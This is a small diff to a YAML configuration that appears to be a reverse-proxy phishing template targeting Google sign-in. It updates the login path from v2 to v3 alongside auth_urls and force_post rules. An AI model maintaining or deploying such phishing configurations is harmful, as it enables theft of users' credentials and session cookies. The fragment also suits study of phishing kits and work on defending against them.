@@ -49,7 +49,7 @@ auth_urls:
   - '/ManageAccount'
 login:
   domain: 'accounts.google.com'
-  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+  path: '/signin/v3/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 force_post:
   - path: '/_/signin/sl/challenge'
     search: 
